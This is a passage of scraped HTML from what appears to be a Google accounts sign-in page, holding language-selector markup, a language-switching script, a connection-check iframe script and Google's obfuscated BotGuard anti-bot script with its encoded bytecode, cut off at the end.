  <option value="ne">
  ‪नेपाली‬
  </option>
  <option value="mr">
  ‪मराठी‬
  </option>
  <option value="hi">
  ‪हिन्दी‬
  </option>
  <option value="bn">
  ‪বাংলা‬
  </option>
  <option value="gu">
  ‪ગુજરાતી‬
  </option>
  <option value="ta">
  ‪தமிழ்‬
  </option>
  <option value="te">
  ‪తెలుగు‬
  </option>
  <option value="kn">
  ‪ಕನ್ನಡ‬
  </option>
  <option value="ml">
  ‪മലയാളം‬
  </option>
  <option value="si">
  ‪සිංහල‬
  </option>
  <option value="th">
  ‪ไทย‬
  </option>
  <option value="lo">
  ‪ລາວ‬
  </option>
  <option value="km">
  ‪ខ្មែរ‬
  </option>
  <option value="ko">
  ‪한국어‬
  </option>
  <option value="zh-HK">
  ‪中文（香港）‬
  </option>
  <option value="ja">
  ‪日本語‬
  </option>
  <option value="zh-CN">
  ‪简体中文‬
  </option>
  <option value="zh-TW">
  ‪繁體中文‬
  </option>
  </select>
  </span>
  </div>
  </div>
</div>
  </div>
  <script>
  (function(){
  var splitByFirstChar = function(toBeSplit, splitChar) {
  var index = toBeSplit.indexOf(splitChar);
  if (index >= 0) {
  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
  }
  return [toBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var paramsStr = langChooser_getParamStr(langChooser_params);
            var newHref = langChooser_currentPath + "?" + paramsStr;
            if (langChooser_fragment) {
              newHref = newHref + "#" + langChooser_fragment;
            }
            window.location.href = newHref;
          };
        }
      })();
    </script>
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script>var G,Gb=function(a,b){var c=a;a&&"string"==typeof a&&(c=document.getElementById(a));if(b&&!c)throw new Ga(a);return c},Ga=function(a){this.id=a;this.toString=function(){return"No element found for id '"+this.id+"'"}};var Gc={},Gf=function(a,b,c){var d=function(a){var b=c.call(this,a);!1===b&&Gd(a);return b};a=Gb(a,!0);a.addEventListener(b,d,!1);Ge(a,b).push(d);return d},Gg=function(a,b,c){a=Gb(a,!0);var d=function(){var b=window.event,d=c.call(a,b);!1===d&&Gd(b);return d};a.attachEvent("on"+b,d);Ge(a,b).push(d);return d},Gh;Gh=window.addEventListener?Gf:window.attachEvent?Gg:void 0;var Gd=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;return!1};
var Ge=function(a,b){Gc[a]=Gc[a]||{};Gc[a][b]=Gc[a][b]||[];return Gc[a][b]};var Gi=function(){try{return new XMLHttpRequest}catch(a){for(var b=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],c=0;c<b.length;c++)try{return new ActiveXObject(b[c])}catch(d){}}return null},Gj=function(){this.request=Gi();this.parameters={}};
Gj.prototype.send=function(a,b){var c=[],d;for(d in this.parameters){var e=this.parameters[d];c.push(d+"="+encodeURIComponent(e))}var c=c.join("&"),f=this.request;f.open("POST",a,!0);f.setRequestHeader("Content-type","application/x-www-form-urlencoded");f.onreadystatechange=function(){4==f.readyState&&b({status:f.status,text:f.responseText})};f.send(c)};
Gj.prototype.get=function(a,b){var c=this.request;c.open("GET",a,!0);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var Gl=function(a){this.g=a;this.v=this.o();if(null==this.g)throw new Gk("Empty module name");};G=Gl.prototype;G.o=function(){var a=window.location.pathname;return a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
G.j=function(a,b,c){var d=this.v,e=this.g||"",d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var f=Math.floor(1E4*Math.random()),d=d+"&r="+String(f)}catch(g){}return d};G.send=function(a,b,c){var d=new Gj;d.parameters={};try{var e=this.j(a,b,c);d.get(e,function(){})}catch(f){}};G.error=function(a,b){this.send("ERROR",a,b)};
G.warn=function(a,b){this.send("WARN",a,b)};G.info=function(a,b){this.send("INFO",a,b)};G.f=function(a){var b=this;return function(){try{return a.apply(null,arguments)}catch(c){throw b.error("Uncatched exception: "+c),c;}}};var Gk=function(){};var Gm=Gm||new Gl("uri"),Gn=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([\\w\\d\\-\\u0100-\\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"),Go=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:null},Gp=function(a,b){var c=b.match(Gn)[1]||null,d,e=b.match(Gn)[3]||null;d=e&&decodeURIComponent(e);e=Number(b.match(Gn)[4]||null)||null;if(!c||!d)return Gm.error("Invalid origin Exception",[String(b)]),!1;e||(e=Go(c));var f=a.match(Gn)[1]||null;if(!f||f.toLowerCase()!=
c.toLowerCase())return!1;c=(c=a.match(Gn)[3]||null)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=d.toLowerCase())return!1;(d=Number(a.match(Gn)[4]||null)||null)||(d=Go(f));return e==d};var Gq=Gq||new Gl("check_connection"),Gr=null,Gs=null,Gt=null,Gu=function(a,b){this.c=a;this.b=b;this.a=!1};G=Gu.prototype;G.i=function(a,b){if(!b)return!1;if(0<=a.indexOf(","))return Gq.error("CheckConnection result contains comma",[a]),!1;var c=b.value;b.value=c?c+","+a:a;return!0};G.h=function(a){return this.i(a,Gs)};G.w=function(a){return this.i(a,Gt)};G.m=function(a){a=a.match("^([^:]+):(\\d*):(\\d?)$");return!a||3>a.length?null:a[1]};
G.u=function(a,b){if(!Gp(this.c,a))return!1;if(this.a||!b)return!0;"accessible"==b?(this.h(a),this.a=!0):this.m(b)==this.b&&(this.w(b)||this.h(a),this.a=!0);return!0};G.s=function(){var a;a=this.c;var b="timestamp",c=String((new Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL Exception: "+a);return a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
G.l=function(){var a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.s();a.id=this.b;Gr.appendChild(a)};
var Gv=function(a){return function(b){var c=b.origin.toLowerCase();b=b.data;for(var d=a.length,e=0;e<d&&!a[e].u(c,b);e++);}},Gw=function(){if(window.postMessage){var a;a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var b=window.__CHECK_CONNECTION_CONFIG.connectivityElementId,c=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gr=document.getElementById(a))?(b&&(Gs=document.getElementById(b)),c&&(Gt=document.getElementById(c)),Gs||Gt?a=!0:(Gq.error("Unable to locate the input element to storeCheckConnection result",
["old id: "+String(b),"new id: "+String(c)]),a=!1)):(Gq.error("Unable to locate the iframe anchor to append connection test iframe",["element id: "+a]),a=!1);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Gq.error("Missing iframe URL in old configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){for(var b=a.length,c=[],d=0;d<b;d++)c.push(new Gu(a[d].iframeUri,a[d].domainSymbol));
Gh(window,"message",Gv(c));for(d=0;d<b;d++)c[d].l()}}}},Gx=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Gq.error("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Gq.f(Gw);G_setPostMessageSupportFlag=Gq.f(Gx);
</script>
  <script>
  window.__CHECK_CONNECTION_CONFIG = {
  newResultElementId: 'checkConnection',
  domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\75https%3A%2F%2Faccounts.google.com\46v\75-743931904',domainSymbol: 'youtube'}],
  iframeUri: '',
  iframeOrigin: '',
  connectivityElementId: 'dnConn',
  iframeParentElementId: 'cc_iframe_parent',
  postMsgSupportElementId: 'pstMsg',
  msgContent: 'accessible'
  };
  G_setPostMessageSupportFlag();
  G_checkConnectionMain();
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */(function(){eval('var h=function(a,b,c){return 2>=arguments.length?f.slice.call(a,b):f.slice.call(a,b,c)},p=function(a,b,c,d,e){c=a.split("."),d=k,c[0]in d||!d.execScript||d.execScript("var "+c[0]);for(;c.length&&(e=c.shift());)c.length||void 0===b?d=d[e]?d[e]:d[e]={}:d[e]=b},f=Array.prototype,q=function(a,b,c){if(b=typeof a,"object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;if(c=Object.prototype.toString.call(a),"[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},k=this,t,w=(new function(){},function(a,b,c,d,e){for(a=a.replace(/\\r\\n/g,"\\n"),b=[],d=c=0;d<a.length;d++)e=a.charCodeAt(d),128>e?b[c++]=e:(2048>e?b[c++]=e>>6|192:(b[c++]=e>>12|224,b[c++]=e>>6&63|128),b[c++]=e&63|128);return b}),A=function(a,b,c,d,e,g){try{for(this.c=[],x(this,this.b,0),x(this,this.u,0),x(this,this.ba,"object"==typeof window?window:k),x(this,this.L,0),x(this,this.D,0),x(this,this.C,{}),x(this,this.o,2048),x(this,this.m,this.m),x(this,this.K,0),x(this,this.aa,[]),x(this,this.j,y(4)),this.H=true,x(this,this.l,[]),x(this,this.da,this),x(this,this.g,[]),b=0;64>b;++b);if(a&&"!"==a.charAt(0))this.v=a;else{if(window.atob){for(d=window.atob(a),a=[],e=b=0;e<d.length;e++){for(g=d.charCodeAt(e);255<g;)a[b++]=g&255,g>>=8;a[b++]=g}c=a}else c=null;(this.f=c)&&this.f.length?(this.U=[],this.I()):this.h(this.W)}}catch(l){z(this,l)}},x=(t=A.prototype,t.X=31,function(a,b,c){if(b==a.b||b==a.u)a.c[b]?a.c[b].na(c):a.c[b]=B(c);else if(b!=a.g&&b!=a.j&&b!=a.l||!a.c[b])a.c[b]=C(c,a.a);b==a.D&&(a.G=void 0,x(a,a.b,a.a(a.b)+4))}),D=function(a,b){return a[b]<<24|a[b+1]<<16|a[b+2]<<8|a[b+3]},F=(A.prototype.pa=function(a,b,c,d){if(3==a.length){for(c=0;3>c;c++)b[c]+=a[c];for(c=0,d=[13,8,13,12,16,5,3,10,15];9>c;c++)b[3](b,c%3,d[c])}},t.da=195,function(a,b,c,d){return c=a.a(a.b),a.f&&c<a.f.length?(x(a,a.b,a.f.length),E(a,b)):x(a,a.b,b),d=a.I(),x(a,a.b,c),d}),G=(t.B={},t.o=170,function(a,b,c,d){try{for(d=0;84941944608!=d;)a+=(b<<4^b>>>5)+b^d+c[d&3],d+=2654435769,b+=(a<<4^a>>>5)+a^d+c[d>>>11&3];return[a>>>24,a>>16&255,a>>8&255,a&255,b>>>24,b>>16&255,b>>8&255,b&255]}catch(e){throw e;}}),I=(t.L=112,t.j=14,t.m=225,t.w="caller",t.A=22,t.ba=73,t.V=21,function(a,b,c,d,e,g){for(b={},c=H(a),b.T=H(a),b.s=[],d=H(a)-1,e=H(a),g=0;g<d;g++)b.s.push(H(a));for(b.R=a.a(c),b.S=a.a(e);d--;)b.s[d]=a.a(b.s[d]);return b}),C=(t.ea=15,t.N="toString",t.Z=30,t.fa=12,t.ca=216,t.C=131,t.$=36,function(a,b,c,d,e,g,l,m,n){return e=A.prototype,m=A,n=e.h,l=e.O,g=e.I,d=function(){return c()},c=function(a,r,v){for(a=d[e.w],r=a===b,v=0,a=a&&a[e.w];a&&a!=g&&a!=l&&a!=m&&a!=n&&20>v;)v++,a=a[e.w];return c[e.ia+r+!(!a+(v+3>>3))]},d[e.N]=e,c[e.$]=a,a=void 0,d}),y=(t.aa=171,t.ia=34,t.g=254,t.u=184,function(a,b){for(b=Array(a);a--;)b[a]=255*Math.random()|0;return b}),E=(A.prototype.ra=function(a,b){b.push(a[0]<<24|a[1]<<16|a[2]<<8|a[3]),b.push(a[4]<<24|a[5]<<16|a[6]<<8|a[7]),b.push(a[8]<<24|a[9]<<16|a[10]<<8|a[11])},t.M=178,t.ga=10,function(a,b){a.U.push(a.c.slice()),a.c[a.b]=void 0,x(a,a.b,b)}),J=function(a,b,c,d,e,g){for(e=a.a(b),b=b==a.j?function(b,c,d,g){if(c=e.length,d=c-4>>3,e.la!=d){e.la=d,d=(d<<3)-4,g=[0,0,0,a.a(a.L)];try{e.ja=G(D(e,d),D(e,d+4),g)}catch(r){throw r;}}e.push(e.ja[c&7]^b)}:function(a){e.push(a)},d&&b(d&255),g=0,d=c.length;g<d;g++)b(c[g])},z=(A.prototype.a=function(a,b){if(b=this.c[a],void 0===b)throw this.h(this.Z,0,a),this.B;return b()},t.l=233,function(a,b){a.v=("E:"+b.message+":"+b.stack).slice(0,2048)}),L=(t.D=232,A.prototype.h=function(a,b,c,d){d=this.a(this.u),a=[a,d>>8&255,d&255],void 0!=c&&a.push(c),0==this.a(this.l).length&&(this.c[this.l]=void 0,x(this,this.l,a)),c="",b&&(b.message&&(c+=b.message),b.stack&&(c+=":"+b.stack)),b=this.a(this.o),3<b&&(c=c.slice(0,b-3),b-=c.length+3,c=w(c),J(this,this.j,K(c.length,2).concat(c),this.fa)),x(this,this.o,b)},t.ha=42,function(a,b,c,d){return function(){if(!d||a.H)return x(a,a.ca,arguments),x(a,a.C,c),F(a,b)}}),K=(t.b=198,function(a,b,c,d){for(d=b-1,c=[];0<=d;d--)c[b-1-d]=a>>8*d&255;return c}),H=(t.J=252,t.W=17,function(a,b,c){if(b=a.a(a.b),!(b in a.f))throw a.h(a.X),a.B;return void 0==a.G&&(a.G=D(a.f,b-4),a.F=void 0),a.F!=b>>3&&(a.F=b>>3,c=[0,0,0,a.a(a.D)],a.ka=G(a.G,a.F,c)),x(a,a.b,b+1),a.f[b]^a.ka[b%8]}),B=(A.prototype.qa=function(a,b,c,d){try{d=a[(b+2)%3],a[b]=a[b]-a[(b+1)%3]-d^(1==b?d<<c:d>>>c)}catch(e){throw e;}},t.Y=33,t.P=[function(a,b,c,d){b=H(a),c=H(a),d=H(a),a.a(b)>a.a(c)&&x(a,d,a.a(d)+1)},function(a,b,c,d,e,g,l,m,n){if(b=H(a),c=H(a)<<8|H(a),d="",void 0!=a.c[a.J])for(e=a.a(a.J);c--;)g=e[H(a)<<8|H(a)],d+=g;else{for(d=Array(c),e=0;e<c;e++)d[e]=H(a);for(c=[],g=e=0;e<d.length;)l=d[e++],128>l?c[g++]=String.fromCharCode(l):191<l&&224>l?(m=d[e++],c[g++]=String.fromCharCode((l&31)<<6|m&63)):(m=d[e++],n=d[e++],c[g++]=String.fromCharCode((l&15)<<12|(m&63)<<6|n&63));d=c.join("")}x(a,b,d)},function(a){M(a,4)},function(a){N(a,1)},function(a,b,c,d){b=H(a),c=H(a),d=a.a(H(a)),c=a.a(c),x(a,b,L(a,c,d))},function(a){M(a,2)},function(a,b,c){b=H(a),c=H(a),x(a,c,""+a.a(b))},function(a,b,c,d){b=H(a),c=H(a),d=H(a),a.a(b)==a.a(c)&&x(a,d,a.a(d)+1)},function(a,b,c,d){b=H(a),c=H(a),d=H(a),x(a,d,a.a(b)|a.a(c))},function(a,b){b=I(a),x(a,b.T,b.R.apply(b.S,b.s))},function(a,b){b=a.a(H(a)),E(a,b)},function(){},function(a,b,c,d){if(b=a.U.pop()){for(c=H(a);0<c;c--)d=H(a),b[d]=a.c[d];a.c=b}else x(a,a.b,a.f.length)},function(a,b,c,d,e,g,l){b=I(a),e=b.R,d=b.S,c=b.s,l=c.length,0==l?g=new d[e]:1==l?g=new d[e](c[0]):2==l?g=new d[e](c[0],c[1]):3==l?g=new d[e](c[0],c[1],c[2]):4==l?g=new d[e](c[0],c[1],c[2],c[3]):a.h(a.A),x(a,b.T,g)},function(a,b,c,d){b=H(a),c=H(a),d=H(a),a.a(b)[a.a(c)]=a.a(d)},function(){},function(a){O(a,7)},function(a,b,c,d,e){b=H(a),c=H(a),d=H(a),e=a.a(H(a)),c=a.a(c),d=a.a(d),a.a(b).addEventListener(c,L(a,d,e,true),false)},function(a,b,c){b=H(a),c=H(a),0!=a.a(b)&&x(a,a.b,a.a(c))},function(a,b,c,d,e){for(b=H(a),c=H(a)<<8|H(a),d=Array(c),e=0;e<c;e++)d[e]=H(a);x(a,b,d)},function(a,b,c,d){b=H(a),c=H(a),d=H(a),x(a,d,(a.a(b)in a.a(c))+0)},function(a,b,c,d){b=H(a),c=H(a),d=H(a),x(a,d,a.a(b)>>c)},function(a,b,c,d){b=H(a),c=H(a),d=H(a),c=a.a(c),b=a.a(b),x(a,d,b[c])},function(a,b,c,d,e,g){if(b=H(a),c=H(a),d=H(a),e=H(a),b=a.a(b),c=a.a(c),d=a.a(d),a=a.a(e),"object"==q(b)){for(g in e=[],b)e.push(g);b=e}for(e=0,g=b.length;e<g;e+=d)c(b.slice(e,e+d),a)},function(a){M(a,1)},function(a,b,c){b=H(a),c=H(a),x(a,c,a.a(c)-a.a(b))},function(a,b,c,d){b=H(a),c=H(a),d=H(a),x(a,d,a.a(b)||a.a(c))},function(a){O(a,4)},function(a){O(a,0)},function(a,b,c,d){b=H(a),c=H(a),d=H(a),x(a,d,a.a(b)<<c)},function(){},function(a){N(a,4)},function(a,b,c){b=H(a),c=H(a),b=a.a(b),x(a,c,b)},function(a,b,c){b=H(a),c=H(a),x(a,c,a.a(c)*a.a(b))},function(a,b,c){b=H(a),c=H(a),b=a.a(b),x(a,c,q(b))},function(a,b,c){b=H(a),c=H(a),x(a,c,a.a(c)%a.a(b))},function(a,b,c){b=H(a),c=H(a),x(a,c,a.a(c)+a.a(b))},function(a){O(a,3)},function(a,b,c){b=H(a),c=H(a),x(a,c,function(a){return eval(a)}(a.a(b)))},function(a){N(a,2)}],function(a,b,c){return c=function(){return a},b=function(){return c()},b.na=function(b){a=b},b}),P=(t.K=253,function(a,b,c,d){if(8192>=a.length)return String.fromCharCode.apply(null,a);for(c=0,b="";c<a.length;c+=8192)d=h(a,c,c+8192),b+=String.fromCharCode.apply(null,d);return b}),N=(A.prototype.oa=function(a){return(a=window.performance)&&a.now?function(){return a.now()|0}:function(){return+new Date}}(),function(a,b,c,d){c=H(a),d=H(a),J(a,d,K(a.a(c),b))}),M=function(a,b,c,d){for(c=H(a),d=0;0<b;b--)d=d<<8|H(a);x(a,c,d)},O=(A.prototype.ma=function(a,b){return b=this.O(),a&&a(b),b},function(a,b,c,d,e,g){d=b&3,c=b&4,e=H(a),g=H(a),e=a.a(e),c&&(e=w(""+e)),d&&J(a,g,K(e.length,2)),J(a,g,e)});A.prototype.O=function(a,b,c,d,e,g,l,m,n,u){if(this.v)return this.v;try{if(this.H=false,b=this.a(this.g).length,c=this.a(this.j).length,d=this.a(this.o),this.c[this.M]&&F(this,this.a(this.M)),e=this.a(this.l),0<e.length&&J(this,this.g,K(e.length,2).concat(e),this.ea),g=this.a(this.K)&255,g-=this.a(this.g).length+5,l=this.a(this.j),4<l.length&&(g-=l.length+3),0<g&&J(this,this.g,K(g,2).concat(y(g)),this.ga),4<l.length&&J(this,this.g,K(l.length,2).concat(l),this.ha),m=y(2).concat(this.a(this.g)),m[1]=m[0]^3,n=window.btoa?window.btoa(P(m)).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,""):void 0,n)n="!"+n;else for(e=0,n="";e<m.length;e++)u=m[e][this.N](16),1==u.length&&(u="0"+u),n+=u;this.a(this.g).length=b,this.a(this.j).length=c,x(this,this.o,d),a=n,this.H=true}catch(r){z(this,r),a=this.v}return a},A.prototype.I=function(a,b,c,d,e,g){try{for(d=0,c=void 0,b=5001,a=this.f.length;--b&&(d=this.a(this.b))<a;)try{x(this,this.u,d),e=H(this)%this.P.length,(c=this.P[e])?c(this):this.h(this.V,0,e)}catch(l){l!=this.B&&(g=this.a(this.m),g!=this.m?(x(this,g,l),x(this,this.m,this.m)):this.h(this.A,l))}b||this.h(this.Y)}catch(m){try{this.h(this.A,m)}catch(n){z(this,n)}}return this.a(this.C)};try{window.addEventListener("unload",function(){},false)}catch(Q){}p("botguard.bg",A),p("botguard.bg.prototype.invoke",A.prototype.ma);')})()</script>
  <script type="text/javascript">
  document.bg = new botguard.bg('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